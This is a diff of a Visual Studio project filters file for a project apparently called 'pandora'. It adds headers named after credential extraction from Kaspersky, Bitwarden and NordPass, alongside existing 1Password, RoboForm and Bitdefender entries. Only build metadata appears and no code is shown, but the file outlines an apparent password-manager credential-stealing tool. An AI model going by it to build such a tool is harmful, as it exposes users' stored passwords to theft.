@@ -76,6 +76,21 @@
     <Filter Include="Header Files\roboform\plugin">
       <UniqueIdentifier>{7f9cdf3a-1193-4bcf-900c-41b327c3b939}</UniqueIdentifier>
     </Filter>
+    <Filter Include="Header Files\kaspersky">
+      <UniqueIdentifier>{da8a0bed-62fc-44e3-afcc-7b99eca8e60a}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\bitwarden\app">
+      <UniqueIdentifier>{7bc4ef07-22bc-4ffc-b3f4-4ff8880dc3c5}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\bitwarden\plugin">
+      <UniqueIdentifier>{179476d9-3311-49ce-be73-e3fdbab07541}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\nordpass">
+      <UniqueIdentifier>{ab8d0aa6-8adb-4e23-ad5a-15f5793df22c}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\nordpass\app">
+      <UniqueIdentifier>{b28971a2-433c-4f83-98fd-da806bfb6085}</UniqueIdentifier>
+    </Filter>
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="pandora.cpp">
@@ -140,9 +155,6 @@
     <ClInclude Include="headers\1password\app\getCreds1passwordappEntries2.h">
       <Filter>Header Files\1password\app</Filter>
     </ClInclude>
-    <ClInclude Include="headers\bitwarden\plugin\getCredsbitwardenPluginChrome.h">
-      <Filter>Header Files\bitwarden</Filter>
-    </ClInclude>
     <ClInclude Include="headers\core\FindFourthPID.h">
       <Filter>Header Files\core</Filter>
     </ClInclude>
@@ -172,9 +184,6 @@
     </ClInclude>
     <ClInclude Include="headers\core\saveFile.h">
       <Filter>Header Files\core</Filter>
-    </ClInclude>
-    <ClInclude Include="headers\bitwarden\plugin\getCredsbitwardenPluginChrome2.h">
-      <Filter>Header Files\bitwarden</Filter>
     </ClInclude>
     <ClInclude Include="headers\bitdefender\getCredsbitdefender2.h">
       <Filter>Header Files\bitdefender</Filter>
@@ -229,6 +238,27 @@
     </ClInclude>
     <ClInclude Include="headers\roboform\app\getCredsroboformapp3.h">
       <Filter>Header Files\roboform\app</Filter>
+    </ClInclude>
+    <ClInclude Include="headers\kaspersky\getCredsKasperskyEntries.h">
+      <Filter>Header Files\kaspersky</Filter>
+    </ClInclude>
+    <ClInclude Include="headers\bitwarden\plugin\getCredsbitwardenPluginChrome.h">
+      <Filter>Header Files\bitwarden\plugin</Filter>
+    </ClInclude>
+    <ClInclude Include="headers\bitwarden\plugin\getCredsbitwardenPluginChrome2.h">
+      <Filter>Header Files\bitwarden\plugin</Filter>
+    </ClInclude>
+    <ClInclude Include="headers\bitwarden\app\getCredsbitwardenApp1.h">
+      <Filter>Header Files\bitwarden\app</Filter>
+    </ClInclude>
+    <ClInclude Include="headers\bitwarden\app\getCredsbitwardenApp2.h">
+      <Filter>Header Files\bitwarden\app</Filter>
+    </ClInclude>
+    <ClInclude Include="headers\nordpass\app\getCredsnordpass1.h">
+      <Filter>Header Files\nordpass\app</Filter>
+    </ClInclude>
+    <ClInclude Include="headers\nordpass\app\getCredsnordpass2.h">
+      <Filter>Header Files\nordpass\app</Filter>
     </ClInclude>
   </ItemGroup>
   <ItemGroup>
